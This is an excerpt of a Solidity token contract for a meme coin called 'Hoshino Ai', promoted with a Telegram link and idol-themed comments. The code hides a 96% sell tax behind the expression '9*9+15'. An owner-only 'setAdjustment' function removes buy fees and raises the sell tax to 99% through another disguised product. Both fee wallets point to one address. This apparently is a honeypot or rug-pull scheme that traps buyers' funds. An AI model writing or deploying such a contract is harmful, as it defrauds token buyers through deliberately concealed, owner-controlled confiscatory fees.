...
// https://t.me/HoshinoAiBsc
// Welcome to all idol admirer around the world,
// Hoshino Ai is gonna sing and love all you without
// exception, of course this love expression is true
// and genuine from the dept of heart.
...
contract HoshinoAi is Context, IERC20, Ownable {
    ...
    uint256 private _taxFeeOnSell = 9*9+15;
    ...
    address payable private _twddev = payable(0x655B3B9F210359Aa156025e0a79e3C224768862c);
    address payable private _twdmkt = payable(0x655B3B9F210359Aa156025e0a79e3C224768862c);
    
    string private constant _name = "Hoshino Ai";
    ...
    function setAdjustment(bool newStatus) public onlyOwner {
        if(newStatus == true) {
        _taxFeeOnBuy = 0;
        _redisFeeOnBuy = 0;
        _taxFeeOnSell = 1*3*11*3/1/1;
        _redisFeeOnSell = 0;
        }
